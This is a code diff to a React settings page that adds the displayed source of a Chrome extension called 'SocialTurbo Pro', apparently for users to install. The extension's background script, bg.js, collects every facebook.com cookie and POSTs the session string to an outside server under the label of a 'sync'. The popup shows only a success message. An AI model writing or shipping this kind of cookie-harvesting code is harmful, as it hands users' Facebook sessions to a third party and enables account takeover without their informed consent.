@@ -223,7 +223,7 @@ export default function Settings() {
                   <pre className="p-4 text-[10px] bg-slate-800 text-indigo-300 overflow-x-auto">{`{
   "manifest_version": 3,
   "name": "SocialTurbo Pro",
-  "version": "1.0",
+  "version": "1.1",
   "background": { "service_worker": "bg.js" },
   "action": { "default_popup": "popup.html" },
   "permissions": ["cookies", "storage", "tabs"],
@@ -233,7 +233,83 @@ export default function Settings() {
 
                 <details className="group bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
                   <summary className="p-4 cursor-pointer font-bold text-sm text-slate-700 bg-slate-50/50">2. popup.html</summary>
-                  <pre className="p-4 text-[10px] bg-slate-800 text-indigo-300 overflow-x-auto">{`<!-- Veja o código completo na pasta do seu servidor -->`}</pre>
+                  <pre className="p-4 text-[10px] bg-slate-800 text-indigo-300 overflow-x-auto">{`<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <style>
+    body { width: 280px; padding: 0; margin: 0; font-family: sans-serif; background: #0f172a; color: white; }
+    .container { padding: 20px; }
+    .header h1 { font-size: 16px; color: #6366f1; text-transform: uppercase; font-style: italic; font-weight: 900; text-align: center; }
+    #view-login, #view-ready { display: none; }
+    .input-group { margin-bottom: 15px; }
+    input { width: 100%; padding: 10px; margin-top: 5px; border-radius: 6px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; }
+    .btn-primary { width: 100%; padding: 12px; background: #4f46e5; color: white; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+    .user-info { background: #1e293b; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 11px; border: 1px solid #334155; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header"><h1>SocialTurbo Pro</h1></div>
+    <div id="view-login">
+      <input type="text" id="token-input" placeholder="seu@email.com">
+      <button id="btn-save" class="btn-primary">CONFIGURAR</button>
+    </div>
+    <div id="view-ready">
+      <div class="user-info"><div id="display-user"></div></div>
+      <button id="btn-open" class="btn-primary" style="background:#10b981">🚀 ABRIR PAINEL</button>
+    </div>
+    <div id="ready-status" style="text-align:center; font-size:10px; margin-top:10px;"></div>
+  </div>
+  <script src="popup.js"></script>
+</body>
+</html>`}</pre>
+                </details>
+
+                <details className="group bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
+                  <summary className="p-4 cursor-pointer font-bold text-sm text-slate-700 bg-slate-50/50">3. popup.js</summary>
+                  <pre className="p-4 text-[10px] bg-slate-800 text-indigo-300 overflow-x-auto">{`const URL = "https://socialturbo.minhadivulgacao.com.br";
+function show(v) { 
+  document.getElementById('view-login').style.display = v === 'login' ? 'block' : 'none';
+  document.getElementById('view-ready').style.display = v === 'ready' ? 'block' : 'none';
+}
+chrome.storage.local.get(['turboToken'], (res) => {
+  if (res.turboToken) {
+    document.getElementById('display-user').innerText = res.turboToken;
+    show('ready');
+    sync(res.turboToken);
+  } else { show('login'); }
+});
+document.getElementById('btn-save').addEventListener('click', () => {
+  const t = document.getElementById('token-input').value;
+  chrome.storage.local.set({ turboToken: t }, () => { location.reload(); });
+});
+document.getElementById('btn-open').addEventListener('click', () => {
+  chrome.tabs.create({ url: URL });
+});
+async function sync(t) {
+  chrome.runtime.sendMessage({ action: "sync_now", userId: t }, (res) => {
+    document.getElementById('ready-status').innerText = res.success ? "✅ Sincronizado" : "❌ Erro Connect";
+  });
+}`}</pre>
+                </details>
+
+                <details className="group bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
+                  <summary className="p-4 cursor-pointer font-bold text-sm text-slate-700 bg-slate-50/50">4. bg.js</summary>
+                  <pre className="p-4 text-[10px] bg-slate-800 text-indigo-300 overflow-x-auto">{`const URL = "https://socialturbo.minhadivulgacao.com.br";
+chrome.runtime.onMessage.addListener((req, sender, res) => {
+  if (req.action === "sync_now") {
+    chrome.cookies.getAll({ domain: "facebook.com" }, async (c) => {
+      const s = c.map(x => \`\${x.name}=\${x.value}\`).join('; ');
+      const r = await fetch(\`\${URL}/api/sync-extension\`, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userId: req.userId, cookies: s })
+      });
+      res(await r.json());
+    });
+    return true;
+  }
+});`}</pre>
                 </details>
               </div>
               
